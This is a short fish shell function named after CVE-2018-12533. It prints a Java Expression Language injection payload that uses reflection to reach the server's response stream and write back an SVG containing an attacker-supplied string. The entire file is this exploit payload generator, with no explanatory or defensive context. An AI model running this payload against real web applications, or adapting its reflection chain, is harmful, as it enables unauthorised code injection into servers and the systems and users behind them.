# Defined in /var/folders/07/jwb4g7cx1277dvy9tszxstp80000gn/T//fish.5duzBq/@cve2018-12533-svgpayload.fish @ line 2
function @cve2018-12533-svgpayload
	echo '#{(("".getClass().forName("java.io.OutputStream").getMethod("write", "".getBytes().getClass()).invoke(facesContext.getExternalContext().getResponseOutputStream(), "".format("%s%s%s", "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><svg xmlns=\"http://www.w3.org/2000/svg\" height=\"100\" width=\"100\" style=\"background-color:green\"><text x=\"20\" y=\"20\" stroke=\"green\" id=\"output\">",'$argv[1]', "</text></svg>").getBytes()) == null ? "".getClass().forName("java.io.OutputStream").getMethod("close").invoke(facesContext.getExternalContext().getResponseOutputStream()) : null) == null).toString()}'
end
